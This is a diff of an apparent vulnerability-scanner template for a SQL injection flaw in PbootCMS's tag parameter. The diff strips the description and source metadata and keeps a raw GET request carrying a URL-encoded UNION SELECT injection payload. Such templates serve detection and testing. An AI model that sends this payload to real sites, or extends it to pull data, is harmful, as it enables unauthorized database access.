@@ -3,12 +3,8 @@ info:
   name: PbootCMS tag存在Sql注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gvrd5hn81op652gf'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gvrd5hn81op652gf
-    fofa: app="PBOOTCMS"
 http:
 - raw:
   - GET /?tag=%7Dsql%3A%20%20%7Bpboot%3Alist%20filter%3D1%3D2%29UNION%28SELECT%2F%2A%2A%2F1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2Cmd5%28123456%29%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%29%2F%2A%2A%2F%23%2F%2A%2A%2F%7C123%20scode%3D123%7D%5Blist%3Alink%20link%3Dasd%5D%7B%2Fpboot%3Alist%7D HTTP/1.1
